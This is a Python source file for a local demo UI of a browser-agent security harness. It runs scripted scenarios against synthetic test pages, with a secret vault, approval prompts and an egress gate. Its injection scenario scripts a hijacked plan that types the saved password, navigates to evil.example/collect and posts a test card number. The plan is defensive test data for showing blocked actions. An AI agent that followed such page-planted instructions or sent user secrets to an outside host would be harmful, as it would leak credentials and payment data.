"""Local web UI: python -m zenlens.ui  ->  http://localhost:8765

Pick a synthetic test page and a scenario; see the local vs model-visible values, the exact payloads sent to
the (scripted) planner, approvals asked, and every blocked action. Binds to localhost only. No network calls.
"""
import http.server
import json
import sys
from pathlib import Path

from .agent import run
from .browser import PlaywrightPage
from .capture import Session, snapshot_page
from .demo import DEMO_PW, find
from .executor import Executor
from .gate import Blocked, egress_check
from .llm import Action, ScriptedLLM
from .vault import Vault

ROOT = Path(__file__).resolve().parent.parent
PAGES = ROOT / "testpages"
PORT = 8765
ORIGIN = f"http://localhost:{PORT}"


def preview(sess, page_name):
    sess.page.goto(f"{ORIGIN}/pages/{page_name}")
    raw = {e.id: e.value for e in snapshot_page(sess.page).elements if e.value}
    rows = []
    for e in PlaywrightPage(sess).elements():
        if e["value"] or e["id"] in raw:
            rows.append({"field": e["name"] or e["field_name"] or e["id"], "local": raw.get(e["id"]), "model": e["value"]})
    return rows


def scenario(sess, name, approve):
    vault = Vault({"login_password": DEMO_PW, "saved_card": "4111111111111111"})
    page = PlaywrightPage(sess, [ORIGIN], vault.canaries())
    approvals = []
    if name == "signin":
        page.goto(f"{ORIGIN}/pages/auth.html")
        els = page.elements()
        plan = [Action("type", find(els, type="password"), "{{SECRET:login_password}}", reason="enter password"),
                Action("click", find(els, tag="button"), reason="sign in"), Action("done")]
        goal = "Sign in with my saved password"
    else:
        page.goto(f"{ORIGIN}/pages/injection.html")
        els = page.elements()
        box, post = find(els, tag="textarea"), find(els, tag="button")
        plan = [Action("type", box, "{{SECRET:login_password}}"), Action("navigate", url="https://evil.example/collect"),
                Action("type", box, "my card is 4111 1111 1111 1111"), Action("click", post), Action("done")]
        goal = "Read the thread (page contains a hijack attempt)"
    llm = ScriptedLLM(plan)

    def ask(a, why):
        approvals.append(why)
        return approve

    res = run(goal, page, llm, Executor(page, [ORIGIN], vault, approve=ask), canaries=vault.canaries())
    return {"goal": goal, "status": res.status, "reason": res.reason, "steps": res.history, "approvals": approvals,
            "payloads": [json.loads(p) for p in llm.payloads[:1]],
            "secret_in_payload": any(DEMO_PW in p or "4111111111111111" in p for p in llm.payloads)}


def gate(text):
    try:
        egress_check(text)
        return {"ok": True}
    except Blocked as e:
        return {"ok": False, "reason": str(e)}


class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *a, **k):
        super().__init__(*a, directory=str(PAGES), **k)

    def log_message(self, *a):
        pass

    def _json(self, obj, code=200):
        b = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        if self.path in ("/", "/index.html"):
            b = Path(__file__).with_name("ui.html").read_bytes()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)
        elif self.path == "/api/pages":
            self._json(sorted(p.name for p in PAGES.glob("*.html")))
        elif self.path.startswith("/pages/"):
            self.path = self.path[len("/pages"):]
            super().do_GET()
        else:
            self.send_error(404)

    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers.get("Content-Length") or 0)) or b"{}")
        try:
            if self.path == "/api/gate":
                return self._json(gate(str(body.get("text", ""))))
            with Session() as sess:
                if self.path == "/api/preview":
                    name = Path(body.get("page", "")).name
                    return self._json(preview(sess, name))
                if self.path == "/api/run":
                    return self._json(scenario(sess, body.get("scenario"), bool(body.get("approve"))))
        except Exception as e:  # keep the UI alive; type only, messages may hold page text
            return self._json({"error": type(e).__name__}, 500)
        self.send_error(404)


def main():
    srv = http.server.ThreadingHTTPServer(("localhost", PORT), Handler)
    print(f"ZenLens UI on {ORIGIN}", file=sys.stderr)
    srv.serve_forever()


if __name__ == "__main__":
    main()
